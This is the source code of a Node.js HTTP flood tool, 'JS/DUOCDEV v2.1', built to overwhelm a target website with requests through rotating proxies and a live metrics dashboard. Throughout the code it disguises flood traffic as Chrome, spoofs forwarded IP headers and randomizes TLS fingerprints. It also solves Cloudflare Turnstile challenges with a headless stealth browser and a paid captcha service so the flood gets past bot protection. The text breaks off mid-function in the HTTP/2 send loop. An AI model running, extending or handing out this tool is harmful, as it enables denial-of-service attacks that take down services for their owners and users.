/**
 * JS/DUOCDEV v2.1 — single-file build
 * tool + metrics + dashboard, all inline.
 *
 * Chạy:
 *   node tool.js -u https://target.com -p proxies.txt -s 300 -t 8 -r 100
 *   node tool.js -u https://target.com -p proxies.txt -s 300 --dashboard 8080
 */

const net = require('net');
const tls = require('tls');
const http = require('http');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const colors = require('colors');
const { Command } = require('commander');
const { SocksClient } = require('socks');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

let Captcha = null;
try { Captcha = require('2captcha'); } catch (_) {}

process.setMaxListeners(0);
process.on('uncaughtException', (e) => { if (process.env.DEBUG_ERR === '1') console.error('[uncaught]', e?.message); });
process.on('unhandledRejection', (e) => { if (process.env.DEBUG_ERR === '1') console.error('[unhandled]', e?.message); });

/* ============================================================
 *  METRICS
 * ============================================================ */
class Metrics {
  constructor() {
    this.start = Date.now();
    this.sent = 0;
    this.success = 0;
    this.fail = 0;
    this.bytesOut = 0;
    this.bytesIn = 0;
    this.status = {};
    this.latencies = [];
    this.secBuckets = new Map();
  }
  addSent(bytes = 0) { this.sent++; this.bytesOut += bytes; }
  addIn(bytes = 0)   { this.bytesIn += bytes; }
  record(code) {
    const s = String(code);
    this.status[s] = (this.status[s] || 0) + 1;
    if (s[0] === '2' || s[0] === '3') this.success++;
    else if (s[0] === '4' || s[0] === '5') this.fail++;
    const sec = Math.floor(Date.now() / 1000);
    this.secBuckets.set(sec, (this.secBuckets.get(sec) || 0) + 1);
    for (const k of this.secBuckets.keys()) if (k < sec - 180) this.secBuckets.delete(k);
  }
  recordLatency(ms) {
    this.latencies.push(ms);
    if (this.latencies.length > 2000) this.latencies.shift();
  }
  _pct(p) {
    if (!this.latencies.length) return 0;
    const s = [...this.latencies].sort((a, b) => a - b);
    return s[Math.min(s.length - 1, Math.floor(s.length * p))];
  }
  snapshot() {
    const now = Math.floor(Date.now() / 1000);
    const timeline = [];
    for (let i = 29; i >= 0; i--) timeline.push(this.secBuckets.get(now - i) || 0);
    const recent = timeline.slice(-10);
    const recentAvg = recent.reduce((a, b) => a + b, 0) / 10;
    const elapsed = Math.max(1, (Date.now() - this.start) / 1000);
    return {
      elapsed: Math.floor(elapsed),
      sent: this.sent,
      success: this.success,
      fail: this.fail,
      successRate: this.sent ? (this.success / this.sent) * 100 : 0,
      rps: this.sent / elapsed,
      rpsRecent: recentAvg,
      bytesOut: this.bytesOut,
      bytesIn: this.bytesIn,
      status: { ...this.status },
      latencyAvg: this.latencies.length ? this.latencies.reduce((a, b) => a + b, 0) / this.latencies.length : 0,
      latencyP50: this._pct(0.50),
      latencyP95: this._pct(0.95),
      latencyP99: this._pct(0.99),
      timeline,
      latencies: this.latencies.slice(-200),
    };
  }
}

/* ============================================================
 *  DASHBOARD (SSE)
 * ============================================================ */
const DASH_HTML = `<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>DUOCDEV · live</title>
<style>
  *{box-sizing:border-box} body{background:#0b0d10;color:#c9d1d9;font-family:'SF Mono',Menlo,Consolas,monospace;margin:0;padding:24px}
  h1{font-size:13px;color:#58a6ff;margin:0 0 18px;letter-spacing:1px;font-weight:600}
  .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;margin-bottom:16px}
  .card{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:14px}
  .label{font-size:10px;color:#8b949e;text-transform:uppercase;letter-spacing:.8px}
  .value{font-size:24px;color:#f0f6fc;font-weight:600;margin-top:6px;font-variant-numeric:tabular-nums}
  .sub{font-size:11px;color:#8b949e;margin-top:2px}
  canvas{width:100%;height:180px;background:#161b22;border:1px solid #30363d;border-radius:6px;display:block}
  .status{display:flex;flex-wrap:wrap;gap:6px;margin-top:12px}
  .st{font-size:11px;padding:4px 10px;border-radius:4px;background:#161b22;border:1px solid #30363d;font-variant-numeric:tabular-nums}
  .st.ok{color:#3fb950;border-color:#238636} .st.warn{color:#d29922;border-color:#9e6a03} .st.bad{color:#f85149;border-color:#da3633}
</style></head><body>
<h1>▸ JS/DUOCDEV — live metrics</h1>
<div class="grid">
  <div class="card"><div class="label">RPS</div><div class="value" id="rps">—</div><div class="sub" id="rpsr">—</div></div>
  <div class="card"><div class="label">Sent</div><div class="value" id="sent">—</div><div class="sub" id="bps">—</div></div>
  <div class="card"><div class="label">Success</div><div class="value" id="ok">—</div></div>
  <div class="card"><div class="label">Fail</div><div class="value" id="bad">—</div></div>
  <div class="card"><div class="label">Success %</div><div class="value" id="sr">—</div></div>
  <div class="card"><div class="label">Lat avg</div><div class="value" id="la">—</div></div>
  <div class="card"><div class="label">Lat p95</div><div class="value" id="lp">—</div></div>
  <div class="card"><div class="label">Elapsed</div><div class="value" id="t">—</div></div>
</div>
<canvas id="c"></canvas>
<div class="status" id="st"></div>
<script>
const $ = id => document.getElementById(id);
const fmt = (n, d=0) => Number(n||0).toFixed(d);
const cv = $('c'); const ctx = cv.getContext('2d');
let hist = [];
function draw() {
  cv.width = cv.offsetWidth * 2; cv.height = cv.offsetHeight * 2;
  const w = cv.width, h = cv.height, pad = 16;
  ctx.clearRect(0,0,w,h);
  if (!hist.length) return;
  const max = Math.max(1, ...hist);
  const step = (w - pad*2) / Math.max(1, hist.length-1);
  ctx.beginPath();
  hist.forEach((v,i) => {
    const x = pad + i*step, y = h-pad - (v/max)*(h-pad*2);
    i ? ctx.lineTo(x,y) : ctx.moveTo(x,y);
  });
  ctx.lineTo(w-pad, h-pad); ctx.lineTo(pad, h-pad); ctx.closePath();
  ctx.fillStyle = 'rgba(88,166,255,.12)'; ctx.fill();
  ctx.beginPath();
  hist.forEach((v,i) => {
    const x = pad + i*step, y = h-pad - (v/max)*(h-pad*2);
    i ? ctx.lineTo(x,y) : ctx.moveTo(x,y);
  });
  ctx.strokeStyle = '#58a6ff'; ctx.lineWidth = 4; ctx.stroke();
  ctx.fillStyle = '#8b949e'; ctx.font = '20px monospace';
  ctx.fillText(max + '/s', pad, 28);
}
const es = new EventSource('/stream');
es.onmessage = ev => {
  const d = JSON.parse(ev.data);
  $('rps').textContent = fmt(d.rps,1);
  $('rpsr').textContent = '1s: ' + fmt(d.rpsRecent,1) + '/s';
  $('sent').textContent = d.sent.toLocaleString();
  $('bps').textContent = (d.bytesOut/1024).toFixed(1) + ' KB out';
  $('ok').textContent = d.success.toLocaleString();
  $('bad').textContent = d.fail.toLocaleString();
  $('sr').textContent = fmt(d.successRate,1) + '%';
  $('la').textContent = fmt(d.latencyAvg,0) + 'ms';
  $('lp').textContent = fmt(d.latencyP95,0) + 'ms';
  $('t').textContent = d.elapsed + 's';
  hist = d.timeline.slice(-30); draw();
  const s = Object.entries(d.status).sort((a,b)=>b[1]-a[1]);
  $('st').innerHTML = s.map(([k,v]) => {
    const cls = k[0]==='2'||k[0]==='3'?'ok':k[0]==='4'?'warn':'bad';
    return '<div class="st '+cls+'">'+k+' · '+v+'</div>';
  }).join('');
};
window.addEventListener('resize', draw);
</script></body></html>`;

function startDashboard(port, getSnapshot) {
  const server = http.createServer((req, res) => {
    if (req.url === '/stream') {
      res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache', 'Connection': 'keep-alive' });
      const t = setInterval(() => { try { res.write(`data: ${JSON.stringify(getSnapshot())}\n\n`); } catch (_) {} }, 500);
      req.on('close', () => clearInterval(t));
      return;
    }
    if (req.url === '/metrics') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify(getSnapshot()));
    }
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(DASH_HTML);
  });
  server.listen(port, () => console.log(`[dashboard] http://localhost:${port}`));
  return server;
}

/* ============================================================
 *  CLI
 * ============================================================ */
const program = new Command();
program
  .option('-m, --method <method>', 'Request method', 'GET')
  .option('-u, --target <url>', 'Target URL')
  .option('-s, --time <seconds>', 'Duration', '120')
  .option('-t, --threads <number>', 'Threads', '4')
  .option('-r, --rate <rate>', 'Requests per second', '60')
  .option('-p, --proxy <path>', 'Proxy file')
  .option('-T, --type <type>', 'Proxy type (http|https|socks4|socks5)', 'http')
  .option('-d, --debug <bool>', 'Debug output', 'true')
  .option('-v, --http <version>', 'HTTP version (1|2)', '2')
  .option('--full <bool>', 'Full Sec-CH-UA headers', 'false')
  .option('--extra <bool>', 'X-Forwarded-* headers', 'false')
  .option('--delay <ms>', 'Connection spawn delay', '10')
  .option('-D, --data <data>', 'Request body (string or RAND)')
  .option('--cache <bool>', 'Cache-control bypass', 'false')
  .option('--close <bool>', 'Close on bad response', 'false')
  .option('--conns <n>', 'Max connections per worker')
  .option('-q, --query <bool>', 'Random query string', 'false')
  .option('--rand-rate <spec>', 'Random rate: true | min-max | base', '')
  .option('--rand-path <bool>', 'Random path suffix', 'false')
  .option('--ratelimit <bool>', 'Handle 429 with Retry-After', 'false')
  .option('-I, --ip <ip>', 'Static X-Forwarded-For IP')
  .option('-U, --ua <agent>', 'User-Agent override')
  .option('-C, --cookie <cookie>', 'Cookie (string or RAND)')
  .option('-F, --fingerprint <bool>', 'Cipher/curve randomization', 'false')
  .option('-R, --referer <url>', 'Referer (url or RAND)')
  .option('--checker <bool>', 'Proxy checker', 'false')
  .option('--config <file>', 'Load options from JSON')
  .option('--bypass-cf <bool>', 'Cloudflare bypass via headless', 'false')
  .option('--captcha-key <key>', '2Captcha API key', '')
  .option('--dashboard <port>', 'Web dashboard port (0 = off)', '')
  .parse(process.argv);

if (program.opts().config) {
  try {
    const raw = JSON.parse(fs.readFileSync(program.opts().config, 'utf8'));
    for (const [k, v] of Object.entries(raw)) program.setOptionValue(k, v);
  } catch (e) {
    console.error(`[config] ${e.message}`);
    process.exit(1);
  }
}

const o = program.opts();
const b = (v) => v === true || v === 'true' || v === '1' || v === 1;
const i = (v, d) => { const n = parseInt(v, 10); return Number.isFinite(n) ? n : d; };

const cfg = {
  method:      String(o.method || 'GET').toUpperCase(),
  target:      o.target,
  time:        i(o.time, 120),
  threads:     i(o.threads, 4),
  rate:        i(o.rate, 60),
  proxyFile:   o.proxy,
  proxyType:   String(o.type || 'http').toLowerCase(),
  debug:       b(o.debug),
  http:        i(o.http, 2),
  full:        b(o.full),
  extra:       b(o.extra),
  delay:       i(o.delay, 10),
  data:        o.data,
  cache:       b(o.cache),
  close:       b(o.close),
  conns:       o.conns ? i(o.conns, null) : null,
  query:       b(o.query),
  randRate:    o.randRate || '',
  randPath:    b(o.randPath),
  ratelimit:   b(o.ratelimit),
  ip:          o.ip,
  ua:          o.ua,
  cookie:      o.cookie,
  fingerprint: b(o.fingerprint),
  referer:     o.referer,
  checker:     b(o.checker),
  bypassCF:    b(o.bypassCf),
  captchaKey:  o.captchaKey || '',
  dashboard:   o.dashboard ? i(o.dashboard, 0) : 0,
};

const METHODS = ['GET','POST','HEAD','PUT','DELETE','CONNECT','OPTIONS','TRACE','PATCH','RAND'];
if (!cfg.target || !cfg.proxyFile) { program.help(); process.exit(1); }
if (!METHODS.includes(cfg.method)) { console.error('[cfg] invalid --method'); process.exit(1); }
if (!['http','https','socks4','socks5'].includes(cfg.proxyType)) { console.error('[cfg] invalid --type'); process.exit(1); }

const targetUrl  = new URL(cfg.target);
const TARGET_HOST   = targetUrl.hostname;
const TARGET_PORT   = parseInt(targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80), 10);
const TARGET_SCHEME = targetUrl.protocol.replace(':', '');
const IS_DEFAULT_PORT = (TARGET_SCHEME === 'https' && TARGET_PORT === 443) || (TARGET_SCHEME === 'http' && TARGET_PORT === 80);
const AUTHORITY = IS_DEFAULT_PORT ? TARGET_HOST : `${TARGET_HOST}:${TARGET_PORT}`;

const PROXIES = fs.readFileSync(cfg.proxyFile, 'utf8')
  .replace(/\r/g, '')
  .split('\n')
  .map(l => l.trim())
  .filter(l => l.length > 0 && l.split(':').length >= 2);

if (!PROXIES.length) { console.error('[cfg] no valid proxies'); process.exit(1); }

let solver = null;
if (cfg.bypassCF && cfg.captchaKey && Captcha) solver = new Captcha.Solver(cfg.captchaKey);

/* ============================================================
 *  HELPERS
 * ============================================================ */
const rndStr = (n) => { let s = ''; for (let k = 0; k < n; k++) s += 'abcdefghijklmnopqrstuvwxyz'[Math.floor(Math.random()*26)]; return s; };
const rndInt = (a, c) => Math.floor(Math.random() * (c - a + 1)) + a;
const rndIP  = () => `${rndInt(1,255)}.${rndInt(1,255)}.${rndInt(1,255)}.${rndInt(1,255)}`;

function rndCookies() {
  const pool = ['JSESSIONID', '_ga', 'PHPSESSID', `_ga_${rndStr(10).toUpperCase()}`];
  const limit = rndInt(1, pool.length);
  const picked = pool.sort(() => Math.random() - 0.5).slice(0, limit);
  return picked.map(n => `${n}=${rndStr(rndInt(16, 48))}`).join('; ');
}

const CIPHERS = [
  'TLS_AES_128_GCM_SHA256','TLS_AES_256_GCM_SHA384','TLS_CHACHA20_POLY1305_SHA256',
  'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256','TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
  'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384','TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
  'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256','TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256',
  'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA','TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA',
  'TLS_RSA_WITH_AES_128_GCM_SHA256','TLS_RSA_WITH_AES_256_GCM_SHA384',
].join(':');
const CURVES  = 'X25519:P-256:P-384:P-521';
const SIGALGS = 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384';

function pickRate() {
  const spec = cfg.randRate;
  if (!spec) return cfg.rate;
  if (spec === 'true') return rndInt(1, 128);
  if (spec.includes('-')) {
    const [a, c] = spec.split('-').map(x => parseInt(x, 10));
    if (Number.isFinite(a) && Number.isFinite(c)) return rndInt(Math.min(a,c), Math.max(a,c));
  }
  const base = parseInt(spec, 10);
  if (Number.isFinite(base)) return rndInt(Math.max(1, Math.floor(base*0.5)), Math.ceil(base*1.5));
  return cfg.rate;
}

/* ============================================================
 *  PROXY
 * ============================================================ */
class ProxyConn {
  constructor(host, port, type) { this.host = host; this.port = port; this.type = type.toUpperCase(); this.socket = null; }

  connect(creds = {}) {
    if (this.type === 'SOCKS4' || this.type === 'SOCKS5') return this.viaSocks(creds);
    return this.viaHttp(creds);
  }

  viaSocks(creds) {
    return new Promise((resolve, reject) => {
      SocksClient.createConnection({
        proxy: { host: this.host, port: this.port, type: this.type === 'SOCKS5' ? 5 : 4,
          ...(creds.username && { userId: creds.username, password: creds.password }) },
        command: 'connect',
        destination: { host: TARGET_HOST, port: TARGET_PORT },
        timeout: 10000,
      }, (err, info) => {
        if (err) return reject(err);
        this.socket = info.socket;
        resolve(info.socket);
      });
    });
  }

  viaHttp(creds) {
    return new Promise((resolve, reject) => {
      const sock = net.connect({ host: this.host, port: this.port });
      const timer = setTimeout(() => { sock.destroy(); reject(new Error('proxy timeout')); }, 10000);
      sock.once('connect', () => {
        let head = `CONNECT ${TARGET_HOST}:${TARGET_PORT} HTTP/1.1\r\nHost: ${TARGET_HOST}:${TARGET_PORT}\r\nConnection: Keep-Alive\r\n`;
        if (creds.username && creds.password) {
          head += `Proxy-Authorization: Basic ${Buffer.from(`${creds.username}:${creds.password}`).toString('base64')}\r\n`;
        }
        sock.write(head + '\r\n');
      });
      let buf = Buffer.alloc(0);
      const onData = (d) => {
        buf = Buffer.concat([buf, d]);
        const idx = buf.indexOf('\r\n\r\n');
        if (idx === -1) return;
        clearTimeout(timer);
        sock.removeListener('data', onData);
        const line = buf.subarray(0, buf.indexOf('\r\n')).toString();
        if (/^HTTP\/1\.[01] 2\d\d/.test(line)) { this.socket = sock; resolve(sock); }
        else { sock.destroy(); reject(new Error(`proxy refused: ${line}`)); }
      };
      sock.on('data', onData);
      sock.on('error', (e) => { clearTimeout(timer); reject(e); });
    });
  }

  close() {
    if (this.socket) { try { this.socket.destroy(); } catch (_) {} this.socket.removeAllListeners(); }
  }
}

/* ============================================================
 *  HTTP/2
 * ============================================================ */
const H2_SETTINGS = 0x4, H2_HEADERS = 0x1, H2_DATA = 0x0, H2_WU = 0x8, H2_GOAWAY = 0x7;

class H2 {
  constructor() { this.hpack = new HPACK(); }
  frame(streamId, type, payload = Buffer.alloc(0), flags = 0) {
    const h = Buffer.alloc(9);
    h.writeUIntBE(payload.length, 0, 3);
    h.writeUInt8(type, 3);
    h.writeUInt8(flags, 4);
    h.writeUInt32BE(streamId & 0x7fffffff, 5);
    return payload.length ? Buffer.concat([h, payload]) : h;
  }
  settings(pairs) {
    const p = Buffer.alloc(pairs.length * 6);
    pairs.forEach(([k, v], idx) => { p.writeUInt16BE(k, idx*6); p.writeUInt32BE(v, idx*6+2); });
    return this.frame(0, H2_SETTINGS, p);
  }
  parse(buf) {
    if (buf.length < 9) return null;
    const len = buf.readUIntBE(0, 3);
    if (buf.length < 9 + len) return null;
    return {
      type: buf.readUInt8(3),
      flags: buf.readUInt8(4),
      streamId: buf.readUInt32BE(5) & 0x7fffffff,
      payload: buf.subarray(9, 9 + len),
      rest: buf.subarray(9 + len),
    };
  }
}

/* ============================================================
 *  CF BYPASS
 * ============================================================ */
const cfCache = new Map();
const CF_TTL = 15 * 60 * 1000;

async function fetchCFCookie(proxyHost, proxyPort, proxyType, creds) {
  const hit = cfCache.get(TARGET_HOST);
  if (hit && hit.expires > Date.now()) return hit.cookie;

  const args = ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage'];
  if (proxyHost) args.push(`--proxy-server=${proxyType}://${proxyHost}:${proxyPort}`);

  const browser = await puppeteer.launch({ args, headless: true });
  try {
    const page = await browser.newPage();
    if (creds && creds.username && creds.password) {
      await page.authenticate({ username: creds.username, password: creds.password });
    }
    await page.setUserAgent(`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36`);
    await page.setViewport({ width: 1920, height: 1080 });
    await page.goto(cfg.target, { waitUntil: 'domcontentloaded', timeout: 45000 });

    for (let attempt = 0; attempt < 3; attempt++) {
      const widget = await page.$('[data-sitekey]');
      const frame = await page.$('iframe[src*="challenges.cloudflare.com"]');
      if (!widget && !frame) break;
      if (!solver) break;

      const sitekey = await page.evaluate(() => document.querySelector('[data-sitekey]')?.getAttribute('data-sitekey') || null);
      if (!sitekey) break;

      try {
        const res = await solver.turnstile({ sitekey, pageurl: cfg.target, action: 'managed' });
        const token = res.data;
        await page.evaluate((tok) => {
          const inp = document.querySelector('input[name="cf-turnstile-response"]');
          if (inp) { inp.value = tok; inp.dispatchEvent(new Event('input', { bubbles: true })); }
          document.querySelectorAll('[data-callback]').forEach(w => {
            const cb = w.getAttribute('data-callback');
            if (cb && typeof window[cb] === 'function') { try { window[cb](tok); } catch (_) {} }
          });
        }, token);
        await new Promise(r => setTimeout(r, 4000));
      } catch (_) {
        await new Promise(r => setTimeout(r, 3000));
      }
    }

    await new Promise(r => setTimeout(r, 1500));
    const cookies = await page.cookies();
    const clearance = cookies.find(c => c.name === 'cf_clearance');
    if (!clearance) return null;
    const str = `cf_clearance=${clearance.value}`;
    cfCache.set(TARGET_HOST, { cookie: str, expires: Date.now() + CF_TTL });
    return str;
  } finally {
    await browser.close();
  }
}

/* ============================================================
 *  REQUEST
 * ============================================================ */
class Request {
  constructor() {
    this.path = targetUrl.pathname || '/';
    this.method = cfg.method;
    this.headers = [];
    this.sessionCookies = new Map();
    this.body = null;
    this.authority = AUTHORITY;
    this.extraCookie = null;
  }

  storeSetCookie(raw) {
    const first = raw.split(';')[0];
    const eq = first.indexOf('=');
    if (eq > 0) this.sessionCookies.set(first.slice(0, eq).trim(), first.slice(eq + 1).trim());
  }

  applyRedirect(location) {
    try {
      const u = new URL(location, `${TARGET_SCHEME}://${this.authority}${this.path}`);
      this.path = u.pathname + u.search;
      if (u.host !== this.authority) this.authority = u.host;
    } catch (_) {}
  }

  build() {
    this.headers = [];
    const version = rndInt(126, 131);
    const chromeFull = `${version}.0.${rndInt(6610, 6790)}.${rndInt(10, 100)}`;
    const brand = `"Google Chrome";v="${version}", "Chromium";v="${version}", "Not_A Brand";v="24"`;
    const brandFull = `"Google Chrome";v="${chromeFull}", "Chromium";v="${chromeFull}", "Not_A Brand";v="24.0.0.0"`;

    const ua = cfg.ua || `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;
    let referer = null;
    if (cfg.referer) referer = cfg.referer === 'RAND' ? `https://${rndStr(rndInt(6, 9))}.com/` : cfg.referer;

    let path = this.path;
    if (path.includes('%RAND%')) path = path.replace('%RAND%', rndStr(rndInt(6, 9)));
    if (cfg.randPath) path += (path.endsWith('/') ? '' : '/') + rndStr(rndInt(6, 9));
    if (cfg.query) path += '?' + rndStr(rndInt(6, 9));

    let method = this.method;
    if (method === 'RAND') method = ['GET','POST','HEAD','PUT','DELETE','OPTIONS','PATCH'][rndInt(0, 6)];

    this.body = null;
    if (cfg.data !== undefined && cfg.data !== null && cfg.data !== '') {
      this.body = cfg.data === 'RAND' ? Buffer.from(rndStr(rndInt(10, 100))) : Buffer.from(cfg.data);
    }

    const cookieJar = [];
    if (this.extraCookie) cookieJar.push(this.extraCookie);
    if (this.sessionCookies.size) cookieJar.push(Array.from(this.sessionCookies).map(([k, v]) => `${k}=${v}`).join('; '));
    if (cfg.cookie) cookieJar.push(cfg.cookie === 'RAND' ? rndCookies() : cfg.cookie);

    const push = (k, v) => { if (v !== undefined && v !== null) this.headers.push([k, v]); };
    push(':method', method);
    push(':authority', this.authority);
    push(':scheme', TARGET_SCHEME);
    push(':path', path);

    if (cfg.cache) push('cache-control', Math.random() < 0.5 ? 'max-age=0' : 'no-cache');
    if (method === 'POST' && this.body) {
      push('content-length', String(this.body.length));
      push('content-type', 'application/x-www-form-urlencoded');
    }
    push('sec-ch-ua', brand);
    if (cfg.full) { push('sec-ch-ua-arch', 'x86'); push('sec-ch-ua-bitness', '"64"'); push('sec-ch-ua-full-version', chromeFull); push('sec-ch-ua-full-version-list', brandFull); }
    push('sec-ch-ua-mobile', '?0');
    if (cfg.full) { push('sec-ch-ua-model', '""'); push('sec-ch-ua-platform-version', '"10.0.0"'); }
    push('sec-ch-ua-platform', '"Windows"');
    push('sec-ch-prefers-color-scheme', 'light');
    push('viewport-width', '1920');
    push('dpr', '1');
    push('device-memory', '8');
    push('upgrade-insecure-requests', '1');
    push('user-agent', ua);
    push('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8');
    push('sec-fetch-site', 'none');
    push('sec-fetch-mode', 'navigate');
    push('sec-fetch-user', '?1');
    push('sec-fetch-dest', 'document');
    push('accept-encoding', 'gzip, deflate, br');
    push('accept-language', 'en-US,en;q=0.9');
    if (cfg.extra) {
      push('x-forwarded-for', cfg.ip || (Math.random() < 0.36 ? `${rndIP()}, ${rndIP()}` : rndIP()));
      push('x-forwarded-proto', TARGET_SCHEME);
      push('x-forwarded-scheme', TARGET_SCHEME);
      push('x-real-ip', rndIP());
    }
    if (cookieJar.length) push('cookie', cookieJar.join('; '));
    if (referer) push('referer', referer);
    push('priority', 'u=0, i');
    return this;
  }

  toHttp1() {
    const m = this.headers.find(h => h[0] === ':method')[1];
    const p = this.headers.find(h => h[0] === ':path')[1];
    let s = `${m} ${p} HTTP/1.1\r\nHost: ${this.authority}\r\n`;
    for (const [k, v] of this.headers) {
      if (!k.startsWith(':') && k !== 'priority') s += `${k}: ${v}\r\n`;
    }
    s += 'Connection: keep-alive\r\n\r\n';
    const head = Buffer.from(s, 'utf8');
    return this.body ? Buffer.concat([head, this.body]) : head;
  }

  toHttp2Headers(hpack) {
    return Buffer.concat([Buffer.from([0x80, 0, 0, 0, 0xFF]), hpack.encode(this.headers)]);
  }
}

/* ============================================================
 *  WORKER METRICS HANDLE
 * ============================================================ */
let workerMetrics = null;

/* ============================================================
 *  CONNECTION
 * ============================================================ */
async function openConnection(proxyLine) {
  const [host, portStr, user, pass] = proxyLine.split(':');
  const port = parseInt(portStr, 10);
  if (!host || !Number.isFinite(port)) return;

  const creds = { username: user, password: pass };
  const proxy = new ProxyConn(host, port, cfg.proxyType);

  let sock;
  try { sock = await proxy.connect(creds); }
  catch (_) { proxy.close(); return; }

  let cfCookie = null;
  if (cfg.bypassCF) {
    try { cfCookie = await fetchCFCookie(host, port, cfg.proxyType, creds); } catch (_) {}
  }

  const tlsSock = tls.connect({
    socket: sock,
    servername: TARGET_HOST,
    ALPNProtocols: cfg.http === 1 ? ['http/1.1'] : cfg.http === 2 ? ['h2'] : ['h2','http/1.1'],
    ciphers: CIPHERS,
    ecdhCurve: Math.random() < 0.7 ? 'X25519' : CURVES,
    sigalgs: SIGALGS,
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    rejectUnauthorized: false,
  });

  const req = new Request();
  if (cfCookie) req.extraCookie = cfCookie;

  let alive = true;
  const cleanup = () => { try { tlsSock.destroy(); } catch (_) {} proxy.close(); };

  tlsSock.once('error', cleanup);
  tlsSock.once('close', cleanup);

  const retry = (waitSec) => {
    alive = false; cleanup();
    setTimeout(() => openConnection(proxyLine), waitSec * 1000);
  };

  let h2, streamId = 1;
  const pendingStreams = new Map();
  const gcTimer = setInterval(() => {
    const now = Date.now();
    for (const [id, ts] of pendingStreams) if (now - ts > 30000) pendingStreams.delete(id);
  }, 5000);
  gcTimer.unref();

  /* ---------- HTTP/2 ---------- */
  const onDataH2 = (chunk) => {
    let buf = chunk;
    while (alive) {
      const f = h2.parse(buf);
      if (!f) break;
      buf = f.rest;
      if (f.type === H2_HEADERS) {
        try {
          const sentAt = pendingStreams.get(f.streamId);
          if (sentAt) { workerMetrics?.recordLatency(Date.now() - sentAt); pendingStreams.delete(f.streamId); }
          workerMetrics?.addIn(f.payload.length);

          const hs = h2.hpack.decode(f.payload);
          const status = hs.find(x => x[0] === ':status')?.[1];
          const setCookie = hs.find(x => x[0].toLowerCase() === 'set-cookie')?.[1];
          const location = hs.find(x => x[0].toLowerCase() === 'location')?.[1];
          const retryAfter = hs.find(x => x[0].toLowerCase() === 'retry-after')?.[1];
          if (status) {
            const code = String(status);
            workerMetrics?.record(code);
            if ((code === '403' || code === '1020') && cfg.bypassCF) return retry(5);
            if ((code === '403' || code === '400' || code === '429') && cfg.close) return retry(0.1);
            if (code === '429' && cfg.ratelimit) return retry(Math.max(1, parseInt(retryAfter, 10) || 5));
          }
          if (setCookie) req.storeSetCookie(setCookie);
          if (location) req.applyRedirect(location);
        } catch (_) {}
      } else if (f.type === H2_SETTINGS && f.flags === 0) {
        try { tlsSock.write(h2.frame(0, H2_SETTINGS, Buffer.alloc(0), 0x1)); } catch (_) {}
      } else if (f.type === H2_GOAWAY) {
        return retry(0.5);
      }
    }
  };

  /* ---------- HTTP/1.1 ---------- */
  const onDataH1 = (chunk) => {
    const text = chunk.toString('utf8');
    const m = text.match(/HTTP\/1\.[01] (\d{3})/);
    if (!m) return;
    const code = m[1];
    workerMetrics?.record(code);
    workerMetrics?.addIn(Buffer.byteLength(text, 'utf8'));
    if ((code === '403' || code === '400' || code === '429') && (cfg.close || cfg.bypassCF)) {
      alive = false; cleanup();
    }
  };

  /* ---------- pacing ---------- */
  let currentRate = pickRate();
  const rateTimer = setInterval(() => { currentRate = pickRate(); }, 1000);
  rateTimer.unref();

  const TICK_MS = 25;
  let accum = 0;

  const pacedLoop = (sendFn) => {
    const timer = setInterval(() => {
      if (!alive || tlsSock.destroyed) { clearInterval(timer); clearInterval(rateTimer); clearInterval(gcTimer); return; }
      accum += currentRate * TICK_MS / 1000;
      const batch = Math.floor(accum);
      accum -= batch;
      if (batch > 0) sendFn(batch);
    }, TICK_MS);
    timer.unref();
    return timer;
  };

  tlsSock.once('secureConnect', () => {
    const useH1 = cfg.http === 1 || (cfg.http === 0 && tlsSock.alpnProtocol !== 'h2');

    if (useH1) {
      tlsSock.on('data', onDataH1);
      req.build();
      pacedLoop((batch) => {
        const out = [];
        for (let k = 0; k < batch; k++) { req.build(); out.push(req.toHttp1()); }
        const payload = Buffer.concat(out);
        try { tlsSock.write(payload); workerMetrics?.addSent(payload.length); }
        catch (_) { alive = false; cleanup(); }
      });
      return;
    }

    if (tlsSock.alpnProtocol !== 'h2') { cleanup(); return; }

    h2 = new H2();
    const wu = Buffer.alloc(4); wu.writeUInt32BE(15663105, 0);
    const prelude = Buffer.concat([
      Buffer.from('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n', 'binary'),
      h2.settings([[0x1, 65536], [0x2, 0], [0x4, 6291456], [0x6, 262144]]),
      h2.frame(0, H2_WU, wu),
    ]);
    try { tlsSock.write(prelude); } catch (_) { cleanup(); return; }
    tlsSock.on('data', onDataH2);

    pacedLoop((batch) => {
      const frames = [];
      for (let k = 0; k < batch; k++) {
        req.build();
        frames.push(h2.frame(streamId, H2_HEADERS, req.toHttp2Headers(h2.hpack), 0x1 | 0x4 | 0x20));
        if (req.body) frames.push(h2.frame(streamId, H2_DATA, req.body, 0x1));
        pendingStreams.set(streamId, Date.now());
        streamId += 2;
        if (streamId > 0x40000000) { alive = false; break; }
      }
      if (!alive) { cleanup(); return; }
      const payload = Buffer.concat(frames);
